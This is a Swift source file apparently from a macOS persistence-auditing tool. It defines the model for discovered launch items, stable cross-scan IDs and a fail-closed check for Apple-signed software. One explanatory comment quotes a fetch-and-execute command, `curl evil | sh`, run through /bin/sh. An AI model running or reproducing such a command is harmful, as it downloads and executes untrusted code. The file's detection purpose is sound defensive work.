import Foundation

/// Represents a single discovered persistence mechanism entry.
public struct PersistenceItem: Identifiable, Codable, Hashable, Sendable {
    public let id: UUID
    public let category: PersistenceCategory
    public let name: String
    public let label: String?
    public let configPath: String?
    public let executablePath: String?
    public let arguments: [String]
    /// Whether launchd (or the owning subsystem) will actually run this item.
    /// Mutable because the authoritative answer for launchd lives in the
    /// override database, not in the plist — see `LaunchdStateResolver`.
    public var isEnabled: Bool
    public var runContext: RunContext
    public let owner: ItemOwner
    public var signingInfo: SigningInfo?
    public var riskLevel: RiskLevel
    /// Findings that argue this item is risky.
    public var riskReasons: [String]
    /// Facts that argue the opposite — a valid team identity, notarization, a
    /// SIP-protected location. Kept separate so a Critical item does not present
    /// its own mitigations as warnings.
    public var riskMitigations: [String]
    public var source: ItemSource
    public let timestamps: ItemTimestamps
    /// Mutable so scanners can annotate an item after it is built (loaded state,
    /// workflow actions) without reconstructing the whole struct — three
    /// hand-rolled full-struct copies existed only for that, each of which would
    /// have silently reset any newly added field.
    public var rawMetadata: [String: PlistValue]

    public init(
        id: UUID = UUID(),
        category: PersistenceCategory,
        name: String,
        label: String? = nil,
        configPath: String? = nil,
        executablePath: String? = nil,
        arguments: [String] = [],
        isEnabled: Bool = true,
        runContext: RunContext = .login,
        owner: ItemOwner = .system,
        signingInfo: SigningInfo? = nil,
        riskLevel: RiskLevel = .medium,
        riskReasons: [String] = [],
        riskMitigations: [String] = [],
        source: ItemSource = .unknown,
        timestamps: ItemTimestamps = ItemTimestamps(),
        rawMetadata: [String: PlistValue] = [:]
    ) {
        self.id = id
        self.category = category
        self.name = name
        self.label = label
        self.configPath = configPath
        self.executablePath = executablePath
        self.arguments = arguments
        self.isEnabled = isEnabled
        self.runContext = runContext
        self.owner = owner
        self.signingInfo = signingInfo
        self.riskLevel = riskLevel
        self.riskReasons = riskReasons
        self.riskMitigations = riskMitigations
        self.source = source
        self.timestamps = timestamps
        self.rawMetadata = rawMetadata
    }

    // Hand-written decoding so reports written by earlier versions still load
    // through `launchaudit export`.
    private enum CodingKeys: String, CodingKey {
        case id, category, name, label, configPath, executablePath, arguments
        case isEnabled, runContext, owner, signingInfo, riskLevel
        case riskReasons, riskMitigations, source, timestamps, rawMetadata
        case stableID
    }

    public init(from decoder: Decoder) throws {
        let c = try decoder.container(keyedBy: CodingKeys.self)
        id = try c.decodeIfPresent(UUID.self, forKey: .id) ?? UUID()
        category = try c.decode(PersistenceCategory.self, forKey: .category)
        name = try c.decode(String.self, forKey: .name)
        label = try c.decodeIfPresent(String.self, forKey: .label)
        configPath = try c.decodeIfPresent(String.self, forKey: .configPath)
        executablePath = try c.decodeIfPresent(String.self, forKey: .executablePath)
        arguments = try c.decodeIfPresent([String].self, forKey: .arguments) ?? []
        isEnabled = try c.decodeIfPresent(Bool.self, forKey: .isEnabled) ?? true
        runContext = try c.decodeIfPresent(RunContext.self, forKey: .runContext) ?? .unknown
        owner = try c.decodeIfPresent(ItemOwner.self, forKey: .owner) ?? .system
        signingInfo = try c.decodeIfPresent(SigningInfo.self, forKey: .signingInfo)
        riskLevel = try c.decodeIfPresent(RiskLevel.self, forKey: .riskLevel) ?? .medium
        riskReasons = try c.decodeIfPresent([String].self, forKey: .riskReasons) ?? []
        riskMitigations = try c.decodeIfPresent([String].self, forKey: .riskMitigations) ?? []
        source = try c.decodeIfPresent(ItemSource.self, forKey: .source) ?? .unknown
        timestamps = try c.decodeIfPresent(ItemTimestamps.self, forKey: .timestamps)
            ?? ItemTimestamps()
        rawMetadata = try c.decodeIfPresent([String: PlistValue].self, forKey: .rawMetadata) ?? [:]
    }

    public func encode(to encoder: Encoder) throws {
        var c = encoder.container(keyedBy: CodingKeys.self)
        try c.encode(id, forKey: .id)
        try c.encode(category, forKey: .category)
        try c.encode(name, forKey: .name)
        try c.encodeIfPresent(label, forKey: .label)
        try c.encodeIfPresent(configPath, forKey: .configPath)
        try c.encodeIfPresent(executablePath, forKey: .executablePath)
        try c.encode(arguments, forKey: .arguments)
        try c.encode(isEnabled, forKey: .isEnabled)
        try c.encode(runContext, forKey: .runContext)
        try c.encode(owner, forKey: .owner)
        try c.encodeIfPresent(signingInfo, forKey: .signingInfo)
        try c.encode(riskLevel, forKey: .riskLevel)
        try c.encode(riskReasons, forKey: .riskReasons)
        try c.encode(riskMitigations, forKey: .riskMitigations)
        try c.encode(source, forKey: .source)
        try c.encode(timestamps, forKey: .timestamps)
        try c.encode(rawMetadata, forKey: .rawMetadata)
        // Emitted so consumers can correlate the same item across scans. `id` is
        // a fresh UUID every run, which made two scans of an unchanged machine
        // differ on every single record.
        try c.encode(stableID, forKey: .stableID)
    }
}

extension PersistenceItem {
    /// Content-addressed identity that survives across scans.
    ///
    /// Derived from what actually identifies the item — its category, label and
    /// paths — so a baseline can be compared against a later scan. Deliberately
    /// excludes timestamps, risk and signing state, which are the things a diff
    /// needs to report as *changed* rather than as a different item.
    public var stableID: String {
        let parts = [
            category.rawValue,
            label ?? name,
            configPath ?? "",
            executablePath ?? "",
        ]
        return Self.digest(parts.joined(separator: "\u{1F}"))
    }

    private static func digest(_ text: String) -> String {
        // FNV-1a, 64-bit. Sufficient for correlating records within a report and
        // avoids pulling CryptoKit into the model layer.
        var hash: UInt64 = 0xcbf2_9ce4_8422_2325
        for byte in text.utf8 {
            hash ^= UInt64(byte)
            hash = hash &* 0x100_0000_01b3
        }
        return String(format: "%016llx", hash)
    }
}

extension PersistenceItem {
    /// True only when there is positive evidence that this item is Apple's own
    /// software. This is what the "hide Apple-signed" filters key on, so it has
    /// to **fail closed**: anything we cannot prove is Apple stays visible.
    ///
    /// The previous implementation fell through to a bundle-identifier heuristic
    /// whenever signature verification produced nothing, which let an unsigned
    /// bundle claim `CFBundleIdentifier = com.apple.quicklook.Video` and vanish
    /// from the default view of both the GUI and the CLI.
    public var isVerifiedAppleSoftware: Bool {
        // An interpreter's signature says nothing about the code it runs.
        // `/bin/sh` is Apple-signed; `/bin/sh -c "curl evil | sh"` is not Apple
        // software, and that is the most common shape of real persistence.
        if isInterpreterFronted { return false }

        guard let info = signingInfo else {
            // No signature evidence at all. The one case where that is expected
            // and safe is content on the sealed system volume, which SIP
            // protects and which carries no separate executable to verify.
            return configPath.map(PathUtilities.isAppleOwnedPath) ?? false
        }

        guard info.isAppleSigned else { return false }

        // Apple's binary, but who registered it? A third-party plist pointing at
        // an Apple tool is third-party persistence. That question does not arise
        // when the configuration is sealed inside the same signature.
        if let config = configPath, !PathUtilities.isAppleOwnedPath(config),
           !isConfigCoveredBySignature {
            return false
        }
        return true
    }

    /// The file whose code signature vouches for this item.
    ///
    /// Usually the executable (or the script an interpreter runs). A codeless
    /// bundle has no executable at all — `AppleMobileDevice.kext` is only an
    /// `Info.plist` of driver-matching rules — but the bundle itself is signed,
    /// and verifying nothing left it with no signature evidence, so it scored
    /// High and stayed visible with Apple items hidden.
    ///
    /// Only bundles that carry a signature qualify. Document bundles (Automator
    /// workflows) are not code, and bundles on the sealed system volume are not
    /// individually signed: the volume seal covers them, so "verifying" either
    /// would wrongly report them as unsigned.
    public var signatureTargetPath: String? {
        if let path = effectiveExecutablePath { return path }
        if let config = configPath, !PathUtilities.isAppleOwnedPath(config),
           PathUtilities.isSignedBundle(config) {
            return config
        }
        return nil
    }

    /// True when the configuration is part of the signed code — a bundle whose
    /// signature seals its own `Info.plist` — rather than a separate file that
    /// merely points at a signed binary.
    public var isConfigCoveredBySignature: Bool {
        guard let config = configPath, PathUtilities.isSignedBundle(config),
              let target = signatureTargetPath else { return false }
        let bundle = config.hasSuffix("/") ? config : config + "/"
        return target == config || target.hasPrefix(bundle)
    }

    /// True when this item lives somewhere only Apple writes and SIP protects.
    ///
    /// These need no signature to be trustworthy: the sealed system volume is
    /// cryptographically verified at boot and cannot be modified in place, so the
    /// absence of a verifiable binary is expected rather than suspicious.
    public var isOnSealedSystemVolume: Bool {
        guard let config = configPath else { return false }
        return PathUtilities.isAppleOwnedPath(config)
    }

    /// True when the registered executable is a general-purpose interpreter, so
    /// the real payload is in `arguments` rather than the binary.
    public var isInterpreterFronted: Bool {
        guard let executable = executablePath else { return false }
        guard Interpreters.isInterpreter(executable) else { return false }
        // Only meaningful if something is actually being passed to it.
        return interpretedPayload != nil
    }

    /// The script or inline command an interpreter-fronted item will execute.
    public var interpretedPayload: InterpreterPayload? {
        guard let executable = executablePath,
              Interpreters.isInterpreter(executable) else { return nil }
        return Interpreters.payload(interpreter: executable, arguments: arguments)
    }

    /// The path whose trustworthiness actually determines this item's risk: the
    /// interpreted script when there is one, otherwise the executable.
    public var effectiveExecutablePath: String? {
        if let script = interpretedPayload?.scriptPath { return script }
        return executablePath
    }
}

// MARK: - Supporting Types

public enum RunContext: String, Codable, Hashable, Sendable {
    case boot       // Runs at system boot (before login)
    case login      // Runs at user login
    case scheduled  // Runs on a schedule (cron, periodic, StartCalendarInterval)
    case onDemand   // Runs when triggered (WatchPaths, Mach service, etc.)
    case triggered  // Runs in response to events (emond, folder actions)
    case always     // KeepAlive / always running
    case manual     // Only runs when explicitly invoked
    case unknown
}

public enum ItemOwner: Codable, Hashable, Sendable {
    case system
    case user(String)

    public var displayName: String {
        switch self {
        case .system: return "System"
        case .user(let name): return name
        }
    }
}

public enum ItemSource: Codable, Hashable, Sendable {
    case apple
    case thirdParty(String) // developer name / team ID
    case unknown

    public var displayName: String {
        switch self {
        case .apple: return "Apple"
        case .thirdParty(let dev): return dev
        case .unknown: return "Unknown"
        }
    }

    public var isApple: Bool {
        if case .apple = self { return true }
        return false
    }
}

public struct ItemTimestamps: Codable, Hashable, Sendable {
    public let created: Date?
    public let modified: Date?

    public init(created: Date? = nil, modified: Date? = nil) {
        self.created = created
        self.modified = modified
    }
}
